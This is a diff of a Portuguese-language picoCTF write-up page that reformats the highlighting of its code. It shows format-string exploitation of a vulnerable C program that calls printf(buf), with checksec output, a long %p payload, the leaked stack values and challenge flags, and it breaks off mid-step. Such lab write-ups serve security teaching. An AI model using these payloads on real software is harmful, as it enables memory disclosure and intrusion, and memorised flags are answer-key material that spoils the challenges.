@@ -1163,53 +1163,59 @@ Pe20021560_Portobello
 Enter your recommendation: Cla%sic_Che%s%steak
 ClaCla%sic_Che%s%steakic_Che(null)
 picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
-</code></pre><p>O que aconteceu foi que o <code>%s</code> na entrada tenta imprimir strings armazenadas em endereços de memória. Como <code>printf</code> não tem argumentos para <code>%s</code>, ele usa argumentos da memória, levando a um erro de segmentação (segfault) e revelando a flag.</p><p>flag: <code>picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}</code></p><h2 id=format-string-1>format string 1</h2><p>Source code:</p><p>#include &lt;stdio.h></p><p>int main() {
-char buf[1024];
-char secret1[64];
-char flag[64];
-char secret2[64];</p><p>// Read in first secret menu item
-FILE *fd = fopen(&ldquo;secret-menu-item-1.txt&rdquo;, &ldquo;r&rdquo;);
-if (fd == NULL){
-printf("&lsquo;secret-menu-item-1.txt&rsquo; file not found, aborting.\n");
-return 1;
-}
-fgets(secret1, 64, fd);
-// Read in the flag
-fd = fopen(&ldquo;flag.txt&rdquo;, &ldquo;r&rdquo;);
-if (fd == NULL){
-printf("&lsquo;flag.txt&rsquo; file not found, aborting.\n");
-return 1;
-}
-fgets(flag, 64, fd);
-// Read in second secret menu item
-fd = fopen(&ldquo;secret-menu-item-2.txt&rdquo;, &ldquo;r&rdquo;);
-if (fd == NULL){
-printf("&lsquo;secret-menu-item-2.txt&rsquo; file not found, aborting.\n");
-return 1;
-}
-fgets(secret2, 64, fd);</p><p>printf(&ldquo;Give me your order and I&rsquo;ll read it back to you:\n&rdquo;);
-fflush(stdout);
-scanf("%1024s", buf);
-printf(&ldquo;Here&rsquo;s your order: &ldquo;);
-printf(buf);
-printf("\n&rdquo;);
-fflush(stdout);</p><p>printf(&ldquo;Bye!\n&rdquo;);
-fflush(stdout);</p><p>return 0;
-}</p><pre tabindex=0><code>
-Checksec:
-</code></pre><pre><code>Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-</code></pre><pre tabindex=0><code>
-Temos uma vulnerabilidade de format string aqui:
-
-```c
-  scanf(&#34;%1024s&#34;, buf);
-  printf(&#34;Here&#39;s your order: &#34;);
-  printf(buf);
-</code></pre><p>Controlamos o que é fornecido para a função <code>printf</code>. Como não sabemos o tamanho de <code>secret-menu-item-1.txt</code> ou <code>secret-menu-item-2.txt</code>, pode ficar meio difícil saber em qual lugar da memória a string em <code>flag.txt</code>está. Então eu decidi simplesmente colocar um monte de <code>%p</code>e ver o que eu consigo:</p><pre tabindex=0><code>Give me your order and I&#39;ll read it back to you:
+</code></pre><p>O que aconteceu foi que o <code>%s</code> na entrada tenta imprimir strings armazenadas em endereços de memória. Como <code>printf</code> não tem argumentos para <code>%s</code>, ele usa argumentos da memória, levando a um erro de segmentação (segfault) e revelando a flag.</p><p>flag: <code>picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}</code></p><h2 id=format-string-1>format string 1</h2><p>Source code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> secret1[<span style=color:#ae81ff>64</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>64</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> secret2[<span style=color:#ae81ff>64</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// Read in first secret menu item
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  FILE <span style=color:#f92672>*</span>fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;secret-menu-item-1.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> NULL){
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&#39;secret-menu-item-1.txt&#39; file not found, aborting.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fgets</span>(secret1, <span style=color:#ae81ff>64</span>, fd);
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// Read in the flag
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;flag.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> NULL){
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&#39;flag.txt&#39; file not found, aborting.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fgets</span>(flag, <span style=color:#ae81ff>64</span>, fd);
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// Read in second secret menu item
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;secret-menu-item-2.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> NULL){
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&#39;secret-menu-item-2.txt&#39; file not found, aborting.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fgets</span>(secret2, <span style=color:#ae81ff>64</span>, fd);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Give me your order and I&#39;ll read it back to you:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fflush</span>(stdout);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%1024s&#34;</span>, buf);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Here&#39;s your order: &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(buf);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fflush</span>(stdout);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Bye!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fflush</span>(stdout);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Checksec:</p><pre tabindex=0><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>Temos uma vulnerabilidade de format string aqui:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%1024s&#34;</span>, buf);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Here&#39;s your order: &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(buf);
+</span></span></code></pre></div><p>Controlamos o que é fornecido para a função <code>printf</code>. Como não sabemos o tamanho de <code>secret-menu-item-1.txt</code> ou <code>secret-menu-item-2.txt</code>, pode ficar meio difícil saber em qual lugar da memória a string em <code>flag.txt</code>está. Então eu decidi simplesmente colocar um monte de <code>%p</code>e ver o que eu consigo:</p><pre tabindex=0><code>Give me your order and I&#39;ll read it back to you:
 %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
 Here&#39;s your order: 0x402118,(nil),0x760c1fa2da00,(nil),0x11a1880,0xa347834,0x7ffcaa973f50,0x760c1f81ee60,0x760c1fa434d0,0x1,0x7ffcaa974020,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x760c1fa458d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x760c1fa56de9,0x760c1f827098,0x760c1fa434d0,(nil),0x7ffcaa974030,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,
 </code></pre><p>A partir do pointer 14, temos uma string. Podemos ver o que ela é fazendo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> int<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>0x7b4654436f636970</span>, <span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#39;little&#39;</span>)
